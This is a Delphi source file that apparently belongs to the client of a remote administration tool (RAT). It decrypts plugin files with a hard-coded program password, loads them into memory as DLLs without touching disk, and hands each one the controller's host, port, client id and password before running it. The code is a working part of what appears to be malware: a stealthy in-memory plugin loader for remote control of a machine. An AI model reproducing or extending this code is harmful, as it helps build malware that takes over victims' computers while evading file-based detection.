unit UnitPluginManager;

interface

uses
  Windows, UnitVariables, UnitConfiguration, BTMemoryModule, UnitFunctions,
  UnitEncryption, UnitConstants;

function LoadPluginsInfos: string;
procedure ExecutePlugin(PluginId: string; FindFile: Boolean = True; CmdId: string = '');

implementation

function LoadPluginsInfos: string;
var
  SchRec: TSearchRec;
  Buffer, TmpStr: string;
  Module: PBTMemoryModule;
  p: Pointer;
  PluginInfos: function(): PChar;
  BufferSize: Int64;
begin
  Result := '';
  if FindFirst(PluginsPath + '\*.*', faAnyFile, SchRec) <> 0 then Exit;
  repeat
    if (SchRec.Attr and faDirectory) = faDirectory then Continue;

    Buffer := FileToStr(PluginsPath + '\' + SchRec.Name);
    BufferSize := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));
    Delete(Buffer, 1, Pos('|', Buffer));
    TmpStr := Copy(Buffer, 1, BufferSize);
    Delete(Buffer, 1, BufferSize);
    Buffer := EnDecryptText(Buffer, PROGRAMPASSWORD);
    if Buffer = '' then Continue;
    p := @Buffer[1];
    
    try
      Module := BTMemoryLoadLibary(p, Length(Buffer));
      if Module = nil then Continue;
      
      @PluginInfos := BTMemoryGetProcAddress(Module, 'PluginInfos');
      if not Assigned(PluginInfos) then Continue;

      Result := Result + IntToStr(BufferSize) + '|' + TmpStr +
        PluginInfos() + SchRec.Name + '|' + #13#10;
    finally
      BTMemoryFreeLibrary(Module);
    end;
  until FindNext(SchRec) <> 0;
  FindClose(SchRec);
end;

procedure ExecutePlugin(PluginId: string; FindFile: Boolean; CmdId: string);
var
  SchRec: TSearchRec;
  Buffer, TmpStr: string;
  Module: PBTMemoryModule;
  p: Pointer;                  
  PluginInfos: function(): PChar;
  PluginFunction: procedure();
  PluginOptions: procedure(_Host: PChar; _Port: Word; _PluginCode, _ClientId,
    _CmdId, _Password: PChar); stdcall;
  BufferSize: Int64;
  TmpList: TStringArray;
begin
  if FindFirst(PluginsPath + '\*.*', faAnyFile, SchRec) <> 0 then Exit;
  repeat
    if (SchRec.Attr and faDirectory) = faDirectory then Continue;

    if FindFile then
    if SchRec.Name <> PluginId then Continue;

    Buffer := FileToStr(PluginsPath + '\' + SchRec.Name);
    BufferSize := StrToInt(Copy(Buffer, 1, Pos('|', Buffer) - 1));
    Delete(Buffer, 1, Pos('|', Buffer));
    Delete(Buffer, 1, BufferSize);
    Buffer := EnDecryptText(Buffer, PROGRAMPASSWORD);
    if Buffer = '' then Continue;
    p := @Buffer[1];
    
    try
      Module := BTMemoryLoadLibary(p, Length(Buffer));
      if Module = nil then Continue;

      if not FindFile then
      begin
        @PluginInfos := BTMemoryGetProcAddress(Module, 'PluginInfos');
        if not Assigned(PluginInfos) then Continue;
        TmpStr := PluginInfos;
        TmpList := ParseString('|', TmpStr);
        if TmpList[5] <> PluginId then Continue;

        @PluginOptions := BTMemoryGetProcAddress(Module, 'PluginOptions');
        if not Assigned(PluginOptions) then Continue;
        PluginOptions(PChar(MainHost), MainPort, '@_^', PChar(ClientId), PChar(CmdId), PChar(_Password));
      end;

      @PluginFunction := BTMemoryGetProcAddress(Module, 'PluginFunction');
      if Assigned(PluginFunction) then PluginFunction;
    finally
      BTMemoryFreeLibrary(Module);
    end;
  until FindNext(SchRec) <> 0;
  FindClose(SchRec);
end;

end.
